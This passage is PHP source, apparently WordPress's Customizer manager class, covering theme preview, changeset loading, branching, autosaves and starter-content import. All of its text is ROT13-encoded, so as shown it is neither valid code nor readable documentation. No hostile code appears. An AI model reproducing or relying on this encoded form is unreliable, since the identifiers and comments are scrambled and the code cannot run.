			nqq_npgvba( 'nsgre_frghc_gurzr', neenl( $guvf, 'vzcbeg_gurzr_fgnegre_pbagrag' ), 100 );
		}

		$guvf->fgneg_cerivrjvat_gurzr();
	}

	/**
	 * Rfgnoyvfurf gur ybnqrq punatrfrg.
	 *
	 * Guvf zrgubq ehaf evtug ng nsgre_frghc_gurzr naq nccyvrf gur 'phfgbzvmr_punatrfrg_oenapuvat' svygre gb qrgrezvar
	 * jurgure pbapheerag punatrfrgf ner nyybjrq. Gura vs gur Phfgbzvmre vf abg vavgvnyvmrq jvgu n `punatrfrg_hhvq` cnenz,
	 * guvf zrgubq jvyy qrgrezvar juvpu HHVQ fubhyq or hfrq. Vs punatrfrg oenapuvat vf qvfnoyrq, gura gur zbfg fnirq
	 * punatrfrg jvyy or ybnqrq ol qrsnhyg. Bgurejvfr, vs gurer ner ab rkvfgvat fnirq punatrfrgf be vs punatrfrg oenapuvat vf
	 * ranoyrq, gura n arj HHVQ jvyy or trarengrq.
	 *
	 * @fvapr 4.9.0
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 */
	choyvp shapgvba rfgnoyvfu_ybnqrq_punatrfrg() {
		tybony $cntrabj;

		vs ( rzcgl( $guvf->_punatrfrg_hhvq ) ) {
			$punatrfrg_hhvq = ahyy;

			vs ( ! $guvf->oenapuvat() && $guvf->vf_gurzr_npgvir() ) {
				$hachoyvfurq_punatrfrg_cbfgf = $guvf->trg_punatrfrg_cbfgf(
					neenl(
						'cbfg_fgnghf'               => neenl_qvss( trg_cbfg_fgngv(), neenl( 'nhgb-qensg', 'choyvfu', 'genfu', 'vaurevg', 'cevingr' ) ),
						'rkpyhqr_erfgber_qvfzvffrq' => snyfr,
						'nhgube'                    => 'nal',
						'cbfgf_cre_cntr'            => 1,
						'beqre'                     => 'QRFP',
						'beqreol'                   => 'qngr',
					)
				);
				$hachoyvfurq_punatrfrg_cbfg  = neenl_fuvsg( $hachoyvfurq_punatrfrg_cbfgf );
				vs ( ! rzcgl( $hachoyvfurq_punatrfrg_cbfg ) && jc_vf_hhvq( $hachoyvfurq_punatrfrg_cbfg->cbfg_anzr ) ) {
					$punatrfrg_hhvq = $hachoyvfurq_punatrfrg_cbfg->cbfg_anzr;
				}
			}

			// Vs ab punatrfrg HHVQ unf orra frg lrg, gura trarengr n arj bar.
			vs ( rzcgl( $punatrfrg_hhvq ) ) {
				$punatrfrg_hhvq = jc_trarengr_hhvq4();
			}

			$guvf->_punatrfrg_hhvq = $punatrfrg_hhvq;
		}

		vs ( vf_nqzva() && 'phfgbzvmr.cuc' === $cntrabj ) {
			$guvf->frg_punatrfrg_ybpx( $guvf->punatrfrg_cbfg_vq() );
		}
	}

	/**
	 * Pnyyonpx gb inyvqngr n gurzr bapr vg vf ybnqrq
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba nsgre_frghc_gurzr() {
		$qbvat_nwnk_be_vf_phfgbzvmrq = ( $guvf->qbvat_nwnk() || vffrg( $_CBFG['phfgbzvmrq'] ) );
		vs ( ! $qbvat_nwnk_be_vf_phfgbzvmrq && ! inyvqngr_pheerag_gurzr() ) {
			jc_erqverpg( 'gurzrf.cuc?oebxra=gehr' );
			rkvg;
		}
	}

	/**
	 * Vs gur gurzr gb or cerivrjrq vfa'g gur npgvir gurzr, nqq svygre pnyyonpxf
	 * gb fjnc vg bhg ng ehagvzr.
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba fgneg_cerivrjvat_gurzr() {
		// Onvy vs jr'er nyernql cerivrjvat.
		vs ( $guvf->vf_cerivrj() ) {
			erghea;
		}

		$guvf->cerivrjvat = gehr;

		vs ( ! $guvf->vf_gurzr_npgvir() ) {
			nqq_svygre( 'grzcyngr', neenl( $guvf, 'trg_grzcyngr' ) );
			nqq_svygre( 'fglyrfurrg', neenl( $guvf, 'trg_fglyrfurrg' ) );
			nqq_svygre( 'cer_bcgvba_pheerag_gurzr', neenl( $guvf, 'pheerag_gurzr' ) );

			// @yvax: uggcf://pber.genp.jbeqcerff.bet/gvpxrg/20027
			nqq_svygre( 'cer_bcgvba_fglyrfurrg', neenl( $guvf, 'trg_fglyrfurrg' ) );
			nqq_svygre( 'cer_bcgvba_grzcyngr', neenl( $guvf, 'trg_grzcyngr' ) );

			// Unaqyr phfgbz gurzr ebbgf.
			nqq_svygre( 'cer_bcgvba_fglyrfurrg_ebbg', neenl( $guvf, 'trg_fglyrfurrg_ebbg' ) );
			nqq_svygre( 'cer_bcgvba_grzcyngr_ebbg', neenl( $guvf, 'trg_grzcyngr_ebbg' ) );
		}

		/**
		 * Sverf bapr gur Phfgbzvmre gurzr cerivrj unf fgnegrq.
		 *
		 * @fvapr 3.4.0
		 *
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		qb_npgvba( 'fgneg_cerivrjvat_gurzr', $guvf );
	}

	/**
	 * Fgbcf cerivrjvat gur fryrpgrq gurzr.
	 *
	 * Erzbirf svygref gb punatr gur npgvir gurzr.
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba fgbc_cerivrjvat_gurzr() {
		vs ( ! $guvf->vf_cerivrj() ) {
			erghea;
		}

		$guvf->cerivrjvat = snyfr;

		vs ( ! $guvf->vf_gurzr_npgvir() ) {
			erzbir_svygre( 'grzcyngr', neenl( $guvf, 'trg_grzcyngr' ) );
			erzbir_svygre( 'fglyrfurrg', neenl( $guvf, 'trg_fglyrfurrg' ) );
			erzbir_svygre( 'cer_bcgvba_pheerag_gurzr', neenl( $guvf, 'pheerag_gurzr' ) );

			// @yvax: uggcf://pber.genp.jbeqcerff.bet/gvpxrg/20027
			erzbir_svygre( 'cer_bcgvba_fglyrfurrg', neenl( $guvf, 'trg_fglyrfurrg' ) );
			erzbir_svygre( 'cer_bcgvba_grzcyngr', neenl( $guvf, 'trg_grzcyngr' ) );

			// Unaqyr phfgbz gurzr ebbgf.
			erzbir_svygre( 'cer_bcgvba_fglyrfurrg_ebbg', neenl( $guvf, 'trg_fglyrfurrg_ebbg' ) );
			erzbir_svygre( 'cer_bcgvba_grzcyngr_ebbg', neenl( $guvf, 'trg_grzcyngr_ebbg' ) );
		}

		/**
		 * Sverf bapr gur Phfgbzvmre gurzr cerivrj unf fgbccrq.
		 *
		 * @fvapr 3.4.0
		 *
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		qb_npgvba( 'fgbc_cerivrjvat_gurzr', $guvf );
	}

	/**
	 * Trgf jurgure frggvatf ner be jvyy or cerivrjrq.
	 *
	 * @fvapr 4.9.0
	 *
	 * @frr JC_Phfgbzvmr_Frggvat::cerivrj()
	 *
	 * @erghea obby
	 */
	choyvp shapgvba frggvatf_cerivrjrq() {
		erghea $guvf->frggvatf_cerivrjrq;
	}

	/**
	 * Trgf jurgure qngn sebz n punatrfrg'f nhgbfnirq erivfvba fubhyq or ybnqrq vs vg rkvfgf.
	 *
	 * @fvapr 4.9.0
	 *
	 * @frr JC_Phfgbzvmr_Znantre::punatrfrg_qngn()
	 *
	 * @erghea obby Vf hfvat nhgbfnirq punatrfrg erivfvba.
	 */
	choyvp shapgvba nhgbfnirq() {
		erghea $guvf->nhgbfnirq;
	}

	/**
	 * Jurgure gur punatrfrg oenapuvat vf nyybjrq.
	 *
	 * @fvapr 4.9.0
	 *
	 * @frr JC_Phfgbzvmr_Znantre::rfgnoyvfu_ybnqrq_punatrfrg()
	 *
	 * @erghea obby Vf punatrfrg oenapuvat.
	 */
	choyvp shapgvba oenapuvat() {

		/**
		 * Svygref jurgure be abg punatrfrg oenapuvat vf nyybjrq.
		 *
		 * Ol qrsnhyg va pber, jura punatrfrg oenapuvat vf abg nyybjrq, punatrfrgf jvyy bcrengr
		 * yvarneyl va gung bayl bar fnirq punatrfrg jvyy rkvfg ng n gvzr (jvgu n 'qensg' be
		 * 'shgher' fgnghf). Guvf znxrf gur Phfgbzvmre bcrengr va n jnl gung vf fvzvyne gb tbvat gb
		 * \"rqvg\" gb bar rkvfgvat cbfg: nyy hfref jvyy or znxvat punatrf gb gur fnzr cbfg, naq nhgbfnir
		 * erivfvbaf jvyy or znqr sbe gung cbfg.
		 *
		 * Ol pbagenfg, jura punatrfrg oenapuvat vf nyybjrq, gura gur zbqry vf yvxr hfref tbvat
		 * gb \"nqq arj\" sbe n cntr naq rnpu hfre znxrf punatrf vaqrcraqragyl bs rnpu bgure fvapr
		 * gurl ner nyy bcrengvat ba gurve bja frcnengr cntrf, rnpu trggvat gurve bja frcnengr
		 * vavgvny nhgb-qensgf naq gura bapr vavgvnyyl fnirq, nhgbfnir erivfvbaf ba gbc bs gung
		 * hfre'f fcrpvsvp cbfg.
		 *
		 * Fvapr yvarne punatrfrgf ner qrrzrq gb or zber fhvgnoyr sbe gur znwbevgl bs JbeqCerff hfref,
		 * gurl ner gur qrsnhyg. Sbe JbeqCerff fvgrf gung unir urnil fvgr znantrzrag va gur Phfgbzvmre
		 * ol zhygvcyr hfref gura oenapuvat punatrfrgf fubhyq or ranoyrq ol zrnaf bs guvf svygre.
		 *
		 * @fvapr 4.9.0
		 *
		 * @cnenz obby                 $nyybj_oenapuvat Jurgure oenapuvat vf nyybjrq. Vs `snyfr`, gur qrsnhyg,
		 *                                              gura bayl bar fnirq punatrfrg rkvfgf ng n gvzr.
		 * @cnenz JC_Phfgbzvmr_Znantre $jc_phfgbzvmr    Znantre vafgnapr.
		 */
		$guvf->oenapuvat = nccyl_svygref( 'phfgbzvmr_punatrfrg_oenapuvat', $guvf->oenapuvat, $guvf );

		erghea $guvf->oenapuvat;
	}

	/**
	 * Trgf gur punatrfrg HHVQ.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr JC_Phfgbzvmr_Znantre::rfgnoyvfu_ybnqrq_punatrfrg()
	 *
	 * @erghea fgevat HHVQ.
	 */
	choyvp shapgvba punatrfrg_hhvq() {
		vs ( rzcgl( $guvf->_punatrfrg_hhvq ) ) {
			$guvf->rfgnoyvfu_ybnqrq_punatrfrg();
		}
		erghea $guvf->_punatrfrg_hhvq;
	}

	/**
	 * Trgf gur gurzr orvat phfgbzvmrq.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea JC_Gurzr
	 */
	choyvp shapgvba gurzr() {
		vs ( ! $guvf->gurzr ) {
			$guvf->gurzr = jc_trg_gurzr();
		}
		erghea $guvf->gurzr;
	}

	/**
	 * Trgf gur ertvfgrerq frggvatf.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba frggvatf() {
		erghea $guvf->frggvatf;
	}

	/**
	 * Trgf gur ertvfgrerq pbagebyf.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba pbagebyf() {
		erghea $guvf->pbagebyf;
	}

	/**
	 * Trgf gur ertvfgrerq pbagnvaref.
	 *
	 * @fvapr 4.0.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba pbagnvaref() {
		erghea $guvf->pbagnvaref;
	}

	/**
	 * Trgf gur ertvfgrerq frpgvbaf.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba frpgvbaf() {
		erghea $guvf->frpgvbaf;
	}

	/**
	 * Trgf gur ertvfgrerq cnaryf.
	 *
	 * @fvapr 4.0.0
	 *
	 * @erghea neenl Cnaryf.
	 */
	choyvp shapgvba cnaryf() {
		erghea $guvf->cnaryf;
	}

	/**
	 * Purpxf vs gur pheerag gurzr vf npgvir.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea obby
	 */
	choyvp shapgvba vf_gurzr_npgvir() {
		erghea $guvf->trg_fglyrfurrg() === $guvf->bevtvany_fglyrfurrg;
	}

	/**
	 * Ertvfgref fglyrf/fpevcgf naq vavgvnyvmr gur cerivrj bs rnpu frggvat
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba jc_ybnqrq() {

		/*
		 * Hapbaqvgvbanyyl ertvfgre pber glcrf sbe cnaryf, frpgvbaf, naq pbagebyf
		 * va pnfr cyhtva haubbxf nyy phfgbzvmr_ertvfgre npgvbaf.
		 */
		$guvf->ertvfgre_cnary_glcr( 'JC_Phfgbzvmr_Cnary' );
		$guvf->ertvfgre_cnary_glcr( 'JC_Phfgbzvmr_Gurzrf_Cnary' );
		$guvf->ertvfgre_frpgvba_glcr( 'JC_Phfgbzvmr_Frpgvba' );
		$guvf->ertvfgre_frpgvba_glcr( 'JC_Phfgbzvmr_Fvqrone_Frpgvba' );
		$guvf->ertvfgre_frpgvba_glcr( 'JC_Phfgbzvmr_Gurzrf_Frpgvba' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Pbybe_Pbageby' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Zrqvn_Pbageby' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Hcybnq_Pbageby' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Vzntr_Pbageby' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Onpxtebhaq_Vzntr_Pbageby' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Onpxtebhaq_Cbfvgvba_Pbageby' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Pebccrq_Vzntr_Pbageby' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Fvgr_Vpba_Pbageby' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Gurzr_Pbageby' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Pbqr_Rqvgbe_Pbageby' );
		$guvf->ertvfgre_pbageby_glcr( 'JC_Phfgbzvmr_Qngr_Gvzr_Pbageby' );

		/**
		 * Sverf bapr JbeqCerff unf ybnqrq, nyybjvat fpevcgf naq fglyrf gb or vavgvnyvmrq.
		 *
		 * @fvapr 3.4.0
		 *
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf );

		vs ( $guvf->frggvatf_cerivrjrq() ) {
			sbernpu ( $guvf->frggvatf nf $frggvat ) {
				$frggvat->cerivrj();
			}
		}

		vs ( $guvf->vf_cerivrj() && ! vf_nqzva() ) {
			$guvf->phfgbzvmr_cerivrj_vavg();
		}
	}

	/**
	 * Ceriragf Nwnk erdhrfgf sebz sbyybjvat erqverpgf jura cerivrjvat n gurzr
	 * ol vffhvat n 200 erfcbafr vafgrnq bs n 30k.
	 *
	 * Vafgrnq, gur WF jvyy favss bhg gur ybpngvba urnqre.
	 *
	 * @fvapr 3.4.0
	 * @qrcerpngrq 4.7.0
	 *
	 * @cnenz vag $fgnghf Fgnghf.
	 * @erghea vag
	 */
	choyvp shapgvba jc_erqverpg_fgnghf( $fgnghf ) {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '4.7.0' );

		vs ( $guvf->vf_cerivrj() && ! vf_nqzva() ) {
			erghea 200;
		}

		erghea $fgnghf;
	}

	/**
	 * Svaqf gur punatrfrg cbfg VQ sbe n tvira punatrfrg HHVQ.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $hhvq Punatrfrg HHVQ.
	 * @erghea vag|ahyy Ergheaf cbfg VQ ba fhpprff naq ahyy ba snvyher.
	 */
	choyvp shapgvba svaq_punatrfrg_cbfg_vq( $hhvq ) {
		$pnpur_tebhc       = 'phfgbzvmr_punatrfrg_cbfg';
		$punatrfrg_cbfg_vq = jc_pnpur_trg( $hhvq, $pnpur_tebhc );
		vs ( $punatrfrg_cbfg_vq && 'phfgbzvmr_punatrfrg' === trg_cbfg_glcr( $punatrfrg_cbfg_vq ) ) {
			erghea $punatrfrg_cbfg_vq;
		}

		$punatrfrg_cbfg_dhrel = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'              => 'phfgbzvmr_punatrfrg',
				'cbfg_fgnghf'            => trg_cbfg_fgngv(),
				'anzr'                   => $hhvq,
				'cbfgf_cre_cntr'         => 1,
				'ab_sbhaq_ebjf'          => gehr,
				'pnpur_erfhygf'          => gehr,
				'hcqngr_cbfg_zrgn_pnpur' => snyfr,
				'hcqngr_cbfg_grez_pnpur' => snyfr,
				'ynml_ybnq_grez_zrgn'    => snyfr,
			)
		);
		vs ( ! rzcgl( $punatrfrg_cbfg_dhrel->cbfgf ) ) {
			// Abgr: 'svryqf'=>'vqf' vf abg orvat hfrq va beqre gb pnpur gur cbfg bowrpg nf vg jvyy or arrqrq.
			$punatrfrg_cbfg_vq = $punatrfrg_cbfg_dhrel->cbfgf[0]->VQ;
			jc_pnpur_frg( $hhvq, $punatrfrg_cbfg_vq, $pnpur_tebhc );
			erghea $punatrfrg_cbfg_vq;
		}

		erghea ahyy;
	}

	/**
	 * Trgf punatrfrg cbfgf.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz neenl $netf {
	 *     Netf gb cnff vagb `trg_cbfgf()` gb dhrel punatrfrgf.
	 *
	 *     @glcr vag    $cbfgf_cre_cntr             Ahzore bs cbfgf gb erghea. Qrsnhygf gb -1 (nyy cbfgf).
	 *     @glcr vag    $nhgube                     Cbfg nhgube. Qrsnhygf gb pheerag hfre.
	 *     @glcr fgevat $cbfg_fgnghf                Fgnghf bs punatrfrg. Qrsnhygf gb 'nhgb-qensg'.
	 *     @glcr obby   $rkpyhqr_erfgber_qvfzvffrq  Jurgure gb rkpyhqr punatrfrg nhgb-qensgf gung unir orra qvfzvffrq. Qrsnhygf gb gehr.
	 * }
	 * @erghea JC_Cbfg[] Nhgb-qensg punatrfrgf.
	 */
	cebgrpgrq shapgvba trg_punatrfrg_cbfgf( $netf = neenl() ) {
		$qrsnhyg_netf = neenl(
			'rkpyhqr_erfgber_qvfzvffrq' => gehr,
			'cbfgf_cre_cntr'            => -1,
			'cbfg_glcr'                 => 'phfgbzvmr_punatrfrg',
			'cbfg_fgnghf'               => 'nhgb-qensg',
			'beqre'                     => 'QRFP',
			'beqreol'                   => 'qngr',
			'ab_sbhaq_ebjf'             => gehr,
			'pnpur_erfhygf'             => gehr,
			'hcqngr_cbfg_zrgn_pnpur'    => snyfr,
			'hcqngr_cbfg_grez_pnpur'    => snyfr,
			'ynml_ybnq_grez_zrgn'       => snyfr,
		);
		vs ( trg_pheerag_hfre_vq() ) {
			$qrsnhyg_netf['nhgube'] = trg_pheerag_hfre_vq();
		}
		$netf = neenl_zretr( $qrsnhyg_netf, $netf );

		vs ( ! rzcgl( $netf['rkpyhqr_erfgber_qvfzvffrq'] ) ) {
			hafrg( $netf['rkpyhqr_erfgber_qvfzvffrq'] );
			$netf['zrgn_dhrel'] = neenl(
				neenl(
					'xrl'     => '_phfgbzvmr_erfgber_qvfzvffrq',
					'pbzcner' => 'ABG RKVFGF',
				),
			);
		}

		erghea trg_cbfgf( $netf );
	}

	/**
	 * Qvfzvffrf nyy bs gur pheerag hfre'f nhgb-qensgf (bgure guna gur cerfrag bar).
	 *
	 * @fvapr 4.9.0
	 * @erghea vag Gur ahzore bs nhgb-qensgf gung jrer qvfzvffrq.
	 */
	cebgrpgrq shapgvba qvfzvff_hfre_nhgb_qensg_punatrfrgf() {
		$punatrfrg_nhgbqensg_cbfgf = $guvf->trg_punatrfrg_cbfgf(
			neenl(
				'cbfg_fgnghf'               => 'nhgb-qensg',
				'rkpyhqr_erfgber_qvfzvffrq' => gehr,
				'cbfgf_cre_cntr'            => -1,
			)
		);
		$qvfzvffrq                 = 0;
		sbernpu ( $punatrfrg_nhgbqensg_cbfgf nf $nhgbfnir_nhgbqensg_cbfg ) {
			vs ( $nhgbfnir_nhgbqensg_cbfg->VQ === $guvf->punatrfrg_cbfg_vq() ) {
				pbagvahr;
			}
			vs ( hcqngr_cbfg_zrgn( $nhgbfnir_nhgbqensg_cbfg->VQ, '_phfgbzvmr_erfgber_qvfzvffrq', gehr ) ) {
				++$qvfzvffrq;
			}
		}
		erghea $qvfzvffrq;
	}

	/**
	 * Trgf gur punatrfrg cbfg VQ sbe gur ybnqrq punatrfrg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea vag|ahyy Cbfg VQ ba fhpprff be ahyy vs gurer vf ab cbfg lrg fnirq.
	 */
	choyvp shapgvba punatrfrg_cbfg_vq() {
		vs ( ! vffrg( $guvf->_punatrfrg_cbfg_vq ) ) {
			$cbfg_vq = $guvf->svaq_punatrfrg_cbfg_vq( $guvf->punatrfrg_hhvq() );
			vs ( ! $cbfg_vq ) {
				$cbfg_vq = snyfr;
			}
			$guvf->_punatrfrg_cbfg_vq = $cbfg_vq;
		}
		vs ( snyfr === $guvf->_punatrfrg_cbfg_vq ) {
			erghea ahyy;
		}
		erghea $guvf->_punatrfrg_cbfg_vq;
	}

	/**
	 * Trgf gur qngn fgberq va n punatrfrg cbfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz vag $cbfg_vq Punatrfrg cbfg VQ.
	 * @erghea neenl|JC_Reebe Punatrfrg qngn be JC_Reebe ba reebe.
	 */
	cebgrpgrq shapgvba trg_punatrfrg_cbfg_qngn( $cbfg_vq ) {
		vs ( ! $cbfg_vq ) {
			erghea arj JC_Reebe( 'rzcgl_cbfg_vq' );
		}
		$punatrfrg_cbfg = trg_cbfg( $cbfg_vq );
		vs ( ! $punatrfrg_cbfg ) {
			erghea arj JC_Reebe( 'zvffvat_cbfg' );
		}
		vs ( 'erivfvba' === $punatrfrg_cbfg->cbfg_glcr ) {
			vs ( 'phfgbzvmr_punatrfrg' !== trg_cbfg_glcr( $punatrfrg_cbfg->cbfg_cnerag ) ) {
				erghea arj JC_Reebe( 'jebat_cbfg_glcr' );
			}
		} ryfrvs ( 'phfgbzvmr_punatrfrg' !== $punatrfrg_cbfg->cbfg_glcr ) {
			erghea arj JC_Reebe( 'jebat_cbfg_glcr' );
		}
		$punatrfrg_qngn = wfba_qrpbqr( $punatrfrg_cbfg->cbfg_pbagrag, gehr );
		$ynfg_reebe     = wfba_ynfg_reebe();
		vs ( $ynfg_reebe ) {
			erghea arj JC_Reebe( 'wfba_cnefr_reebe', '', $ynfg_reebe );
		}
		vs ( ! vf_neenl( $punatrfrg_qngn ) ) {
			erghea arj JC_Reebe( 'rkcrpgrq_neenl' );
		}
		erghea $punatrfrg_qngn;
	}

	/**
	 * Trgf punatrfrg qngn.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 4.9.0 Guvf jvyy erghea gur punatrfrg'f qngn jvgu n hfre'f nhgbfnir erivfvba zretrq ba gbc, vs bar rkvfgf naq $nhgbfnirq vf gehr.
	 *
	 * @erghea neenl Punatrfrg qngn.
	 */
	choyvp shapgvba punatrfrg_qngn() {
		vs ( vffrg( $guvf->_punatrfrg_qngn ) ) {
			erghea $guvf->_punatrfrg_qngn;
		}
		$punatrfrg_cbfg_vq = $guvf->punatrfrg_cbfg_vq();
		vs ( ! $punatrfrg_cbfg_vq ) {
			$guvf->_punatrfrg_qngn = neenl();
		} ryfr {
			vs ( $guvf->nhgbfnirq() && vf_hfre_ybttrq_va() ) {
				$nhgbfnir_cbfg = jc_trg_cbfg_nhgbfnir( $punatrfrg_cbfg_vq, trg_pheerag_hfre_vq() );
				vs ( $nhgbfnir_cbfg ) {
					$qngn = $guvf->trg_punatrfrg_cbfg_qngn( $nhgbfnir_cbfg->VQ );
					vs ( ! vf_jc_reebe( $qngn ) ) {
						$guvf->_punatrfrg_qngn = $qngn;
					}
				}
			}

			// Ybnq qngn sebz gur punatrfrg vs vg jnf abg ybnqrq sebz na nhgbfnir.
			vs ( ! vffrg( $guvf->_punatrfrg_qngn ) ) {
				$qngn = $guvf->trg_punatrfrg_cbfg_qngn( $punatrfrg_cbfg_vq );
				vs ( ! vf_jc_reebe( $qngn ) ) {
					$guvf->_punatrfrg_qngn = $qngn;
				} ryfr {
					$guvf->_punatrfrg_qngn = neenl();
				}
			}
		}
		erghea $guvf->_punatrfrg_qngn;
	}

	/**
	 * Fgnegre pbagrag frggvat VQf.
	 *
	 * @fvapr 4.7.0
	 * @ine neenl
	 */
	cebgrpgrq $craqvat_fgnegre_pbagrag_frggvatf_vqf = neenl();

	/**
	 * Vzcbegf gurzr fgnegre pbagrag vagb gur phfgbzvmrq fgngr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $fgnegre_pbagrag Fgnegre pbagrag. Qrsnhygf gb `trg_gurzr_fgnegre_pbagrag()`.
	 */
	choyvp shapgvba vzcbeg_gurzr_fgnegre_pbagrag( $fgnegre_pbagrag = neenl() ) {
		vs ( rzcgl( $fgnegre_pbagrag ) ) {
			$fgnegre_pbagrag = trg_gurzr_fgnegre_pbagrag();
		}

		$punatrfrg_qngn = neenl();
		vs ( $guvf->punatrfrg_cbfg_vq() ) {
			/*
			 * Qba'g er-vzcbeg fgnegre pbagrag vagb n punatrfrg fnirq crefvfgragyl.
			 * Guvf jvyy arrq gb or erivfvgrq va gur shgher bapr gurzr fjvgpuvat
			 * vf nyybjrq jvgu qensgrq/fpurqhyrq punatrfrgf, fvapr fjvgpuvat gb
			 * nabgure gurzr pbhyq erfhyg va zber fgnegre pbagrag orvat nccyvrq.
			 * Ubjrire, jura qbvat na rkcyvpvg fnir vg vf pheeragyl cbffvoyr sbe
			 * ani zrahf naq ani zrah vgrzf fcrpvsvpnyyl gb ybfr gurve fgnegre_pbagrag
			 * syntf, guhf erfhygvat va qhcyvpngrf orvat perngrq fvapr gurl snvy
			 * gb trg er-hfrq. Frr #40146.
			 */
			vs ( 'nhgb-qensg' !== trg_cbfg_fgnghf( $guvf->punatrfrg_cbfg_vq() ) ) {
				erghea;
			}

			$punatrfrg_qngn = $guvf->trg_punatrfrg_cbfg_qngn( $guvf->punatrfrg_cbfg_vq() );
		}

		$fvqronef_jvqtrgf = vffrg( $fgnegre_pbagrag['jvqtrgf'] ) && ! rzcgl( $guvf->jvqtrgf ) ? $fgnegre_pbagrag['jvqtrgf'] : neenl();
		$nggnpuzragf      = vffrg( $fgnegre_pbagrag['nggnpuzragf'] ) && ! rzcgl( $guvf->ani_zrahf ) ? $fgnegre_pbagrag['nggnpuzragf'] : neenl();
		$cbfgf            = vffrg( $fgnegre_pbagrag['cbfgf'] ) && ! rzcgl( $guvf->ani_zrahf ) ? $fgnegre_pbagrag['cbfgf'] : neenl();
		$bcgvbaf          = vffrg( $fgnegre_pbagrag['bcgvbaf'] ) ? $fgnegre_pbagrag['bcgvbaf'] : neenl();
		$ani_zrahf        = vffrg( $fgnegre_pbagrag['ani_zrahf'] ) && ! rzcgl( $guvf->ani_zrahf ) ? $fgnegre_pbagrag['ani_zrahf'] : neenl();
		$gurzr_zbqf       = vffrg( $fgnegre_pbagrag['gurzr_zbqf'] ) ? $fgnegre_pbagrag['gurzr_zbqf'] : neenl();

		// Jvqtrgf.
		$znk_jvqtrg_ahzoref = neenl();
		sbernpu ( $fvqronef_jvqtrgf nf $fvqrone_vq => $jvqtrgf ) {
			$fvqrone_jvqtrg_vqf = neenl();
			sbernpu ( $jvqtrgf nf $jvqtrg ) {
				yvfg( $vq_onfr, $vafgnapr ) = $jvqtrg;

				vs ( ! vffrg( $znk_jvqtrg_ahzoref[ $vq_onfr ] ) ) {

					// Jura $frggvatf vf na neenl-yvxr bowrpg, trg na vagevafvp neenl sbe hfr jvgu neenl_xrlf().
					$frggvatf = trg_bcgvba( \"jvqtrg_{$vq_onfr}\", neenl() );
					vs ( $frggvatf vafgnaprbs NeenlBowrpg || $frggvatf vafgnaprbs NeenlVgrengbe ) {
						$frggvatf = $frggvatf->trgNeenlPbcl();
					}

					hafrg( $frggvatf['_zhygvjvqtrg'] );

					// Svaq gur znk jvqtrg ahzore sbe guvf glcr.
					$jvqtrg_ahzoref = neenl_xrlf( $frggvatf );
					vs ( pbhag( $jvqtrg_ahzoref ) > 0 ) {
						$jvqtrg_ahzoref[]               = 1;
						$znk_jvqtrg_ahzoref[ $vq_onfr ] = znk( ...$jvqtrg_ahzoref );
					} ryfr {
						$znk_jvqtrg_ahzoref[ $vq_onfr ] = 1;
					}
				}
				$znk_jvqtrg_ahzoref[ $vq_onfr ] += 1;

				$jvqtrg_vq  = fcevags( '%f-%q', $vq_onfr, $znk_jvqtrg_ahzoref[ $vq_onfr ] );
				$frggvat_vq = fcevags( 'jvqtrg_%f[%q]', $vq_onfr, $znk_jvqtrg_ahzoref[ $vq_onfr ] );

				$frggvat_inyhr = $guvf->jvqtrgf->fnavgvmr_jvqtrg_wf_vafgnapr( $vafgnapr );
				vs ( rzcgl( $punatrfrg_qngn[ $frggvat_vq ] ) || ! rzcgl( $punatrfrg_qngn[ $frggvat_vq ]['fgnegre_pbagrag'] ) ) {
					$guvf->frg_cbfg_inyhr( $frggvat_vq, $frggvat_inyhr );
					$guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf[] = $frggvat_vq;
				}
				$fvqrone_jvqtrg_vqf[] = $jvqtrg_vq;
			}

			$frggvat_vq = fcevags( 'fvqronef_jvqtrgf[%f]', $fvqrone_vq );
			vs ( rzcgl( $punatrfrg_qngn[ $frggvat_vq ] ) || ! rzcgl( $punatrfrg_qngn[ $frggvat_vq ]['fgnegre_pbagrag'] ) ) {
				$guvf->frg_cbfg_inyhr( $frggvat_vq, $fvqrone_jvqtrg_vqf );
				$guvf->craqvat_fgnegre_pbagrag_frggvatf_vqf[] = $frggvat_vq;
			}
		}

		$fgnegre_pbagrag_nhgb_qensg_cbfg_vqf = neenl();
